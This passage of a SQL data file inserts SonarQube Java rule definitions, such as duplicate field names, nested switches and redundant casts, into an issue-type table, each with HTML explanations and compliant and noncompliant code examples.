INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1700', 'A field should not duplicate the name of its containing class', 'sonarqube', 'Code Smell', '<p>It''s confusing to have a class member with the same name (case differences aside) as its enclosing class. This is particularly so when you consider
the common practice of naming a class instance for the class itself.</p>
<p>Best practice dictates that any field or member with the same name as the enclosing class be renamed to be more descriptive of the particular
aspect of the class it represents or holds.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private String foo;

  public String getFoo() { }
}

Foo foo = new Foo();
foo.getFoo() // what does this return?
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
  private String name;

  public String getName() { }
}

//...

Foo foo = new Foo();
foo.getName()
</pre>
<h2>Exceptions</h2>
<p>When the type of the field is the containing class and that field is static, no issue is raised to allow singletons named like the type. </p>
<pre>
public class Foo {
  ...
  private static Foo foo;
  public Foo getInstance() {
    if(foo==null) {
      foo = new Foo();
    }
    return foo;
  }
  ...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1710', 'Annotation repetitions should not be wrapped', 'sonarqube', 'Code Smell', '<p>Before Java 8 if you needed to use multiple instances of the same annotation, they had to be wrapped in a container annotation. With Java 8, that''s
no longer necessary, allowing for cleaner, more readable code.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@SomeAnnotations({  // Noncompliant
  @SomeAnnotation(..a..),
  @SomeAnnotation(..b..),
  @SomeAnnotation(..c..),
})
public class SomeClass {
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@SomeAnnotation(..a..)
@SomeAnnotation(..b..)
@SomeAnnotation(..c..)
public class SomeClass {
  ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1711', 'Standard functional interfaces should not be redefined', 'sonarqube', 'Code Smell', '<p>Just as there is little justification for writing your own String class, there is no good reason to re-define one of the existing, standard
functional interfaces.</p>
<p>Doing so may seem tempting, since it would allow you to specify a little extra context with the name. But in the long run, it will be a source of
confusion, because maintenance programmers will wonder what is different between the custom functional interface and the standard one.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@FunctionalInterface
public interface MyInterface { // Noncompliant
	double toDouble(int a);
}

@FunctionalInterface
public interface ExtendedBooleanSupplier { // Noncompliant
  boolean get();
  default boolean isFalse() {
    return !get();
  }
}

public class MyClass {
    private int a;
    public double myMethod(MyInterface instance){
	return instance.toDouble(a);
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@FunctionalInterface
public interface ExtendedBooleanSupplier extends BooleanSupplier { // Compliant, extends java.util.function.BooleanSupplier
  default boolean isFalse() {
    return !getAsBoolean();
  }
}

public class MyClass {
    private int a;
    public double myMethod(IntToDoubleFunction instance){
	return instance.applyAsDouble(a);
    }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1751', 'Loops with at most one iteration should be refactored', 'sonarqube', 'Bug', '<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  printf("i is %d", i);
  break;
}
...
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if (i == x) {
    break;
  } else {
    printf("i is %d", i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf("i is %d", i);
}
...
for (int i = 0; i &lt; 10; i++) {
  if (i == x) {
    break;
  } else {
    printf("i is %d", i);
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1764', 'Identical expressions should not be used on both sides of a binary operator', 'sonarqube', 'Bug', '<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) { // always true
  doZ();
}
if ( a != a ) { // always false
  doY();
}
if ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too
  doX();
}
if ( a == b || a == b ) { // if the first one is true, the second one is too
  doW();
}

int j = 5 / 5; //always 1
int k = 5 - 5; //always 0

c.equals(c); //always true
</pre>
<h2>Exceptions</h2>
<ul>
  <li> This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </li>
  <li> The specific case of testing a floating point value against itself is a valid test for <code>NaN</code> and is therefore ignored. </li>
  <li> Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored. </li>
</ul>
<pre>
float f;
if(f != f) { //test for NaN value
  System.out.println("f is NaN");
}

int i = 1 &lt;&lt; 1; // Compliant
int j = a &lt;&lt; a; // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/5dUxBQ">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed
  </li>
  <li> <a href=''/coding_rules#rule_key=java%3AS1656''>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1774', 'The ternary operator should not be used', 'sonarqube', 'Code Smell', '<p>While the ternary operator is pleasingly compact, its use can make code more difficult to read. It should therefore be avoided in favor of the more
verbose <code>if</code>/<code>else</code> structure.</p>
<h2>Noncompliant Code Example</h2>
<pre>
System.out.println(i&gt;10?"yes":"no");
</pre>
<h2>Compliant Solution</h2>
<pre>
if (i &gt; 10) {
  System.out.println(("yes");
} else {
  System.out.println("no");
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1820', 'Classes should not have too many fields', 'sonarqube', 'Code Smell', '<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain, and
having a lot of fields is an indication that a class has grown too large.</p>
<p>Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1821', '"switch" statements and expressions should not be nested', 'sonarqube', 'Code Smell', '<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement or expression. Therefore nested <code>switch</code> statements and expressions should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements or expressions, but if you cannot, then
consider moving the inner <code>switch</code> to another method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo(int n, int m) {
  switch (n) {
    case 0:
      switch (m) {  // Noncompliant; nested switch
        // ...
      }
    case 1:
      // ...
    default:
      // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo(int n, int m) {
  switch (n) {
    case 0:
      bar(m);
    case 1:
      // ...
    default:
      // ...
  }
}

void bar(int m){
  switch(m) {
    // ...
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1844', '"Object.wait(...)" should never be called on objects that implement "java.util.concurrent.locks.Condition"', 'sonarqube', 'Code Smell', '<p>From the Java API documentation:</p>
<blockquote>
  <p><code>Condition</code> factors out the <code>Object</code> monitor methods (<code>wait</code>, <code>notify</code> and <code>notifyAll</code>)
  into distinct objects to give the effect of having multiple wait-sets per object, by combining them with the use of arbitrary Lock implementations.
  Where a <code>Lock</code> replaces the use of <code>synchronized</code> methods and statements, a <code>Condition</code> replaces the use of the
  <code>Object</code> monitor methods.</p>
</blockquote>
<p>The purpose of implementing the <code>Condition</code> interface is to gain access to its more nuanced <code>await</code> methods. Therefore,
calling the method <code>Object.wait(...)</code> on a class implementing the <code>Condition</code> interface is silly and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
final Lock lock = new ReentrantLock();
final Condition notFull  = lock.newCondition();
...
notFull.wait();
</pre>
<h2>Compliant Solution</h2>
<pre>
final Lock lock = new ReentrantLock();
final Condition notFull  = lock.newCondition();
...
notFull.await();
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1845', 'Methods and field names should not be the same or differ only by capitalization', 'sonarqube', 'Code Smell', '<p>Looking at the set of methods in a class, including superclass methods, and finding two methods or fields that differ only by capitalization is
confusing to users of the class. It is similarly confusing to have a method and a field which differ only in capitalization or a method and a field
with exactly the same name and visibility.</p>
<p>In the case of methods, it may have been a mistake on the part of the original developer, who intended to override a superclass method, but instead
added a new method with nearly the same name.</p>
<p>Otherwise, this situation simply indicates poor naming. Method names should be action-oriented, and thus contain a verb, which is unlikely in the
case where both a method and a member have the same name (with or without capitalization differences). However, renaming a public method could be
disruptive to callers. Therefore renaming the member is the recommended action.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Car{

  public DriveTrain drive;

  public void tearDown(){...}

  public void drive() {...}  // Noncompliant; duplicates field name
}

public class MyCar extends Car{
  public void teardown(){...}  // Noncompliant; not an override. It it really what''s intended?

  public void drivefast(){...}

  public void driveFast(){...} //Huh?
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Car{

  private DriveTrain drive;

  public void tearDown(){...}

  public void drive() {...}  // field visibility reduced
}

public class MyCar extends Car{
  @Override
  public void tearDown(){...}

  public void drivefast(){...}

  public void driveReallyFast(){...}

}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1849', '"Iterator.hasNext()" should not call "Iterator.next()"', 'sonarqube', 'Bug', '<p>Calling <code>Iterator.hasNext()</code> is not supposed to have any side effects, and therefore should not change the state of the iterator.
<code>Iterator.next()</code> advances the iterator by one item. So calling it inside <code>Iterator.hasNext()</code>, breaks the
<code>hasNext()</code> contract, and will lead to unexpected behavior in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FibonacciIterator implements Iterator&lt;Integer&gt;{
...
@Override
public boolean hasNext() {
  if(next() != null) {
    return true;
  }
  return false;
}
...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1850', '"instanceof" operators that always return "true" or "false" should be removed', 'sonarqube', 'Bug', '<p><code>instanceof</code> operators that always return <code>true</code> or <code>false</code> are either useless or the result of a misunderstanding
which could lead to unexpected behavior in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean isSuitable(Integer param) {
...
  String name = null;

  if (name instanceof String) { // Noncompliant; always false since name is null
    //...
  }

  if(param instanceof Number) {  // Noncompliant; always true unless param is null, because param is an Integer
    doSomething();
  }
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isSuitable(Integer param) {
...
  doSomething();
...
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS2589''>S2589</a> instead.</p>', 'java', 'DEPRECATED', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1854', 'Unused assignments should be removed', 'sonarqube', 'Code Smell', '<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it''s not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>true</code>, <code>false</code> and <code>""</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use (''Unused Variable'') </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/39UxBQ">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/9DZGBQ">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1858', '"toString()" should never be called on a String object', 'sonarqube', 'Code Smell', '<p>Invoking a method designed to return a string representation of an object which is already a string is a waste of keystrokes. This redundant
construction may be optimized by the compiler, but will be confusing in the meantime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String message = "hello world";
System.out.println(message.toString()); // Noncompliant;
</pre>
<h2>Compliant Solution</h2>
<pre>
String message = "hello world";
System.out.println(message);
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1860', 'Synchronization should not be done on instances of value-based classes', 'sonarqube', 'Bug', '<p>Objects which are pooled and potentially reused should not be used for synchronization. If they are, it can cause unrelated threads to deadlock
with unhelpful stacktraces. Specifically, <code>String</code> literals, and boxed primitives such as Integers should not be used as lock objects
because they are pooled and reused. The story is even worse for <code>Boolean</code> objects, because there could possibly be only two instances of
<code>Boolean</code>, <code>Boolean.TRUE</code> and <code>Boolean.FALSE</code> and every class that uses a Boolean will be referring to one of the
two.</p>
<p>Here is the list of types which shouldn''t be used for synchronization:</p>
<ul>
  <li> The primitive wrapper classes in java.lang; </li>
  <li> The class java.lang.Runtime.Version; </li>
  <li> The "optional" classes in java.util: Optional, OptionalInt, OptionalLong, and OptionalDouble; </li>
  <li> Many classes in the java.time API: Instant, LocalDate, LocalTime, LocalDateTime, ZonedDateTime, ZoneId, OffsetTime, OffsetDateTime, ZoneOffset,
  Duration, Period, Year, YearMonth, and MonthDay, and, in java.time.chrono: MinguoDate, HijrahDate, JapaneseDate, and ThaiBuddhistDate; </li>
  <li> The interface java.lang.ProcessHandle and its implementation classes; </li>
  <li> The implementation classes of the collection factories in java.util: List.of, List.copyOf, Set.of, Set.copyOf, Map.of, Map.copyOf,
  Map.ofEntries, and Map.entry. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
private static final Boolean bLock = Boolean.FALSE;
private static final Integer iLock = Integer.valueOf(0);
private static final String sLock = "LOCK";
private static final List&lt;String&gt; listLock = List.of("a", "b", "c", "d");

public void doSomething() {

  synchronized(bLock) {  // Noncompliant
    // ...
  }
  synchronized(iLock) {  // Noncompliant
    // ...
  }
  synchronized(sLock) {  // Noncompliant
    // ...
  }
  synchronized(listLock) {  // Noncompliant
    // ...
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final Object lock1 = new Object();
private static final Object lock2 = new Object();
private static final Object lock3 = new Object();
private static final Object lock4 = new Object();

public void doSomething() {

  synchronized(lock1) {
    // ...
  }
  synchronized(lock2) {
    // ...
  }
  synchronized(lock3) {
    // ...
  }
  synchronized(lock4) {
    // ...
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/1zdGBQ">CERT, LCK01-J.</a> - Do not synchronize on objects that may be reused </li>
  <li> <a href="https://openjdk.java.net/jeps/390">JEP-390.</a> - JEP 390: Warnings for Value-Based Classes </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1862', 'Related "if/else if" statements should not have the same condition', 'sonarqube', 'Bug', '<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first
one with a condition that evaluates to <code>true</code>. </p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it''s simply dead code and
at worst, it''s a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 1)  // Noncompliant
  moveWindowToTheBackground();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 3)
  moveWindowToTheBackground();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/5dUxBQ">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1871', 'Two branches in a conditional structure should not have exactly the same implementation', 'sonarqube', 'Code Smell', '<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1''s implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if (a == 1) {
  doSomething();  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse();
} else {
  doSomething();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule <a href=''/coding_rules#rule_key=java%3AS3923''>S3923</a> raises a bug. </p>
<pre>
if (a == 1) {
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething();
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1872', 'Classes should not be compared by name', 'sonarqube', 'Bug', '<p>There is no requirement that class names be unique, only that they be unique within a package. Therefore trying to determine an object''s type based
on its class name is an exercise fraught with danger. One of those dangers is that a malicious user will send objects of the same name as the trusted
class and thereby gain trusted access.</p>
<p>Instead, the <code>instanceof</code> operator or the <code>Class.isAssignableFrom()</code> method should be used to check the object''s underlying
type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
package computer;
class Pear extends Laptop { ... }

package food;
class Pear extends Fruit { ... }

class Store {

  public boolean hasSellByDate(Object item) {
    if ("Pear".equals(item.getClass().getSimpleName())) {  // Noncompliant
      return true;  // Results in throwing away week-old computers
    }
    return false;
  }

  public boolean isList(Class&lt;T&gt; valueClass) {
    if (List.class.getName().equals(valueClass.getName())) {  // Noncompliant
      return true;
    }
    return false;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Store {

  public boolean hasSellByDate(Object item) {
    if (item instanceof food.Pear) {
      return true;
    }
    return false;
  }

  public boolean isList(Class&lt;T&gt; valueClass) {
    if (valueClass.isAssignableFrom(List.class)) {
      return true;
    }
    return false;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/486.html">MITRE, CWE-486</a> - Comparison of Classes by Name </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/eDdGBQ">CERT, OBJ09-J.</a> - Compare classes and not class names </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1874', '"@Deprecated" code should not be used', 'sonarqube', 'Code Smell', '<p>Once deprecated, classes, and interfaces, and their members should be avoided, rather than used, inherited or extended. Deprecation is a warning
that the class or interface has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away
from the aging, soon-to-be-retired technology.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/**
 * @deprecated  As of release 1.3, replaced by {@link #Fee}
 */
@Deprecated
public class Fum { ... }

public class Foo {
  /**
   * @deprecated  As of release 1.7, replaced by {@link #doTheThingBetter()}
   */
  @Deprecated
  public void doTheThing() { ... }

  public void doTheThingBetter() { ... }
}

public class Bar extends Foo {
  public void doTheThing() { ... } // Noncompliant; don''t override a deprecated method or explicitly mark it as @Deprecated
}

public class Bar extends Fum {  // Noncompliant; Fum is deprecated

  public void myMethod() {
    Foo foo = new Foo();  // okay; the class isn''t deprecated
    foo.doTheThing();  // Noncompliant; doTheThing method is deprecated
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/477.html">MITRE, CWE-477</a> - Use of Obsolete Functions </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/6TdGBQ">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1905', 'Redundant casts should not be used', 'sonarqube', 'Code Smell', '<p>Unnecessary casting expressions make the code harder to read and understand.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void example() {
  for (Foo obj : (List&lt;Foo&gt;) getFoos()) {  // Noncompliant; cast unnecessary because List&lt;Foo&gt; is what''s returned
    //...
  }
}

public List&lt;Foo&gt; getFoos() {
  return this.foos;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void example() {
  for (Foo obj : getFoos()) {
    //...
  }
}

public List&lt;Foo&gt; getFoos() {
  return this.foos;
}
</pre>
<h2>Exceptions</h2>
<p>Casting may be required to distinguish the method to call in the case of overloading:</p>
<pre>
class A {}
class B extends A{}
class C {
  void fun(A a){}
  void fun(B b){}

  void foo() {
    B b = new B();
    fun(b);
    fun((A) b); //call the first method so cast is not redundant.
  }

}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1939', 'Extensions and implementations should not be redundant', 'sonarqube', 'Code Smell', '<p>All classes extend <code>Object</code> implicitly. Doing so explicitly is redundant.</p>
<p>Further, declaring the implementation of an interface <em>and</em> one if its parents is also redundant. If you implement the interface, you also
implicitly implement its parents and there''s no need to do so explicitly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface MyFace {
  // ...
}

public interface MyOtherFace extends MyFace {
  // ...
}

public class Foo
    extends Object // Noncompliant
    implements MyFace, MyOtherFace {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface MyFace {
  // ...
}

public interface MyOtherFace extends MyFace {
  // ...
}

public class Foo implements MyOtherFace {
  //...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1940', 'Boolean checks should not be inverted', 'sonarqube', 'Code Smell', '<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( !(a == 2)) { ...}  // Noncompliant
boolean b = !(i &lt; 10);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a != 2) { ...}
boolean b = (i &gt;= 10);
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1941', 'Variables should not be declared before they are relevant', 'sonarqube', 'Code Smell', '<p>For the sake of clarity, variables should be declared as close to where they''re used as possible. This is particularly true when considering
methods that contain early returns and the potential to throw exceptions. In these cases, it is not only pointless, but also confusing to declare a
variable that may never be used because conditions for an early return are met first.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean isConditionMet(int a, int b) {
  int difference = a - b;
  MyClass foo = new MyClass(a);  // Noncompliant; not used before early return

  if (difference &lt; 0) {
    return false;
  }

  // ...

  if (foo.doTheThing()) {
    return true;
  }
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isConditionMet(int a, int b) {
  int difference = a - b;

  if (difference &lt; 0) {
    return false;
  }

  // ...

  MyClass foo = new MyClass(a);
  if (foo.doTheThing()) {
    return true;
  }
  return false;
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1942', 'Simple class names should be used', 'sonarqube', 'Code Smell', '<p>Java''s <code>import</code> mechanism allows the use of simple class names. Therefore, using a class'' fully qualified name in a file that
<code>import</code>s the class is redundant and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import java.util.List;
import java.sql.Timestamp;

//...

java.util.List&lt;String&gt; myList;  // Noncompliant
java.sql.Timestamp tStamp; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.util.List;
import java.sql.Timestamp;

//...

List&lt;String&gt; myList;
Timestamp tStamp;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1943', 'Classes and methods that rely on the default system encoding should not be used', 'sonarqube', 'Code Smell', '<p>Using classes and methods that rely on the default system encoding can result in code that works fine in its "home" environment. But that code may
break for customers who use different encodings in ways that are extremely difficult to diagnose and nearly, if not completely, impossible to
reproduce when it''s time to fix them.</p>
<p>This rule detects uses of the following classes and methods:</p>
<ul>
  <li> <code>FileReader</code> </li>
  <li> <code>FileWriter</code> </li>
  <li> String constructors with a <code>byte[]</code> argument but no <code>Charset</code> argument
    <ul>
      <li> <code>String(byte[] bytes)</code> </li>
      <li> <code>String(byte[] bytes, int offset, int length)</code> </li>
    </ul> </li>
  <li> <code>String.getBytes()</code> </li>
  <li> <code>String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin)</code> </li>
  <li> <code>InputStreamReader(InputStream in)</code> </li>
  <li> <code>OutputStreamWriter(OutputStream out)</code> </li>
  <li> <code>ByteArrayOutputStream.toString()</code> </li>
  <li> Some <code>Formatter</code> constructors
    <ul>
      <li> <code>Formatter(String fileName)</code> </li>
      <li> <code>Formatter(File file)</code> </li>
      <li> <code>Formatter(OutputStream os)</code> </li>
    </ul> </li>
  <li> Some <code>Scanner</code> constructors
    <ul>
      <li> <code>Scanner(File source)</code> </li>
      <li> <code>Scanner(Path source)</code> </li>
      <li> <code>Scanner(InputStream source)</code> </li>
    </ul> </li>
  <li> Some <code>PrintStream</code> constructors
    <ul>
      <li> <code>PrintStream(File file)</code> </li>
      <li> <code>PrintStream(OutputStream out)</code> </li>
      <li> <code>PrintStream(OutputStream out, boolean autoFlush)</code> </li>
      <li> <code>PrintStream(String fileName)</code> </li>
    </ul> </li>
  <li> Some <code>PrintWriter</code> constructors
    <ul>
      <li> <code>PrintWriter(File file)</code> </li>
      <li> <code>PrintWriter(OutputStream out)</code> </li>
      <li> <code>PrintWriter(OutputStream out, boolean autoFlush)</code> </li>
      <li> <code>PrintWriter(String fileName)</code> </li>
    </ul> </li>
  <li> methods from Apache commons-io library which accept an encoding argument when that argument is null, and overloads of those methods that omit
  the encoding argument
    <ul>
      <li> <code>IOUtils.copy(InputStream, Writer)</code> </li>
      <li> <code>IOUtils.copy(Reader, OutputStream)</code> </li>
      <li> <code>IOUtils.readLines(InputStream)</code> </li>
      <li> <code>IOUtils.toByteArray(Reader)</code> </li>
      <li> <code>IOUtils.toByteArray(String)</code> </li>
      <li> <code>IOUtils.toCharArray(InputStream)</code> </li>
      <li> <code>IOUtils.toInputStream(TypeCriteria.subtypeOf(CharSequence))</code> </li>
      <li> <code>IOUtils.toString(byte[])</code> </li>
      <li> <code>IOUtils.toString(URI)</code> </li>
      <li> <code>IOUtils.toString(URL)</code> </li>
      <li> <code>IOUtils.write(char[], OutputStream)</code> </li>
      <li> <code>IOUtils.write(CharSequence, OutputStream)</code> </li>
      <li> <code>IOUtils.writeLines(Collection, String, OutputStream)</code> </li>
      <li> <code>FileUtils.readFileToString(File)</code> </li>
      <li> <code>FileUtils.readLines(File)</code> </li>
      <li> <code>FileUtils.write(File, CharSequence)</code> </li>
